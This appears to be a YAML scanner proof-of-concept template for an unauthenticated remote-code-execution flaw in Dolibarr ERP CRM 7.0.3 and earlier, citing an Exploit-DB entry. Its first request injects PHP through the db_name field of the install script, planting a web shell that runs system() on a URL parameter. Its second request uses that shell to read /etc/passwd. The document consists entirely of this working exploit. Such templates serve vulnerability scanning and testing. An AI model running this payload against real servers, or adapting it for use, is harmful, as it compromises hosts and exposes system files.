name: poc-yaml-dolibarr-rce
rules:
  - method: POST
    path: /install/step1.php
    body: |
     testpost=ok&action=set&main_dir=C%3A%2FAmpps%2Fwww&main_data_dir=C%3A%2FAmpps%2Fwww%2Fdocuments&main_url=http%3A%2F%2Flocalhost+&db_name=x%5C%27%3Bsystem(%24_GET%5Bcmd%5D)%3B%2F%2F&db_type=mysqli&db_host=localhost&db_port=3306&db_prefix=llx_&db_create_database=on&db_user=root&db_pass=root&db_create_user=on&db_user_root=root&db_pass_root=root&selectlang=auto
    follow_redirects: false
    expression: |
     response.status == 200
  - method: GET
    path: /install/check.php?cmd=cat%20/etc/passwd
    expression:
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
detail:
  vulnType: Unauthenticated Remote Code Evaluation in Dolibarr ERP CRM =<7.0.3
  author: supersalted(https://github.com/salted)
  links:
    - https://www.exploit-db.com/exploits/44964
